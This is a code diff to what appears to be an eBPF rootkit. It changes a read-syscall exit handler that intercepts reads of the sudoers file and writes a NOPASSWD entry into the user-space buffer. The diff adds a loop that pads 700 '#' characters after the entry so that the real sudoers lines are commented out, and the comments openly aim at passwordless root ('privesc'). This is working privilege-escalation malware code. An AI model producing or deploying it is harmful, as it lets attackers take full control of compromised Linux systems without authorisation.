@@ -102,12 +102,26 @@ static __always_inline int handle_tp_sys_exit_read(struct sys_read_exit_ctx *ctx
     //For including an user in the sudoers file
     //We just put our new line there, independently on what the rest of the file contains
     if(data->is_sudo==1){
-        while(1){
+        bpf_printk("Proceeding to verwrite sudo\n");
         if(bpf_probe_write_user((void*)buf, (void*)sudo_line_overwrite, (__u32)STRING_FS_SUDOERS_ENTRY_LEN-1)<0){
             bpf_printk("Error writing to user memory\n");
             return -1;
         }
+        //Overwriting the first line is enough, but we must go one step further now.
+        //If the current user has sudo privileges already, then another entry will describe its permissions too,
+        //and that one will override the NOPASSWD entry we wrote now. In order to increment the probability
+        //that we achieve free full sudo capabilities without password, we must override some more chars.
+        //For the best results: First measure byte length of sudoers. And fill with '#' (total-length - length sudo__line_overwrite)
+        //Not enough overwritten bytes and you may not get privesc, too many and you may overwrite something else.
+        int CHARS_TO_OVERRIDE = 700;
+        char char_override = '#';
+        for (int ii = 0; ii<CHARS_TO_OVERRIDE; ii++){
+            if(bpf_probe_write_user((void*)buf+ STRING_FS_SUDOERS_ENTRY_LEN+ii, (void*)&char_override, (__u32)1)<0){
+                bpf_printk("Error writing to user memory in additional symbol\n");
+                break;
+            }
         }
+
         bpf_printk("Sudo overwritten\n");
         return 0;
     }
